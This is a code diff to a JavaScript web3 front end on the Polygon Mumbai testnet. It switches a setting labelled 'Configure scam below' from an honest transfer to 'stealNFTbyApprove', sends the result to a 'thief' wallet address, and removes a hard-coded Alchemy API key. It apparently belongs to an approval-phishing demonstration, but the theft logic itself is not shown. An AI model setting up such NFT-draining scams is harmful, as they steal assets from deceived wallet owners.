@@ -1,5 +1,5 @@
 //require("dotenv").config();
-const alchemyKey = "wss://polygon-mumbai.g.alchemy.com/v2/j05TRbvh8RkOYhh5UsLj807tfSPr9dpp";
+const alchemyKey = <insert key here>;
 const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
 const web3 = createAlchemyWeb3(alchemyKey);
 const { Utils } = require("alchemy-sdk");
@@ -8,7 +8,7 @@ const PBMcontractABI = require("../PBMcontract-abi.json");
 const PBMcontractAddress = "0x265252ba9AC35B2Ae3ffD55D49Dff20BF21432A9";
 const NFTcontractABI=require("../NFTcontract-abi.json");
 const NFTcontractAddress="0x2953399124F0cBB46d2CbACD8A89cF0599974963";
-const NFTtokenID="64005625568718405887533128737887026261369077006440304337836291579393490288641"
+const NFTtokenID="64005625568718405887533128737887026261369077006440304337836291580493001916419"
 
 const StealOptions={
   honestTransfer: Symbol("Transfer"),
@@ -19,7 +19,7 @@ const StealOptions={
   stealNFTbyApprove: Symbol("NFTApprove")
 }
 //Configure scam below
-const action=StealOptions.honestTransfer;
+const action=StealOptions.stealNFTbyApprove;
 const thief="0x50f7c791F55463feD0DB7159Ee1ef8b2C433F8Ca";
 
 export const PBMContract = new web3.eth.Contract(
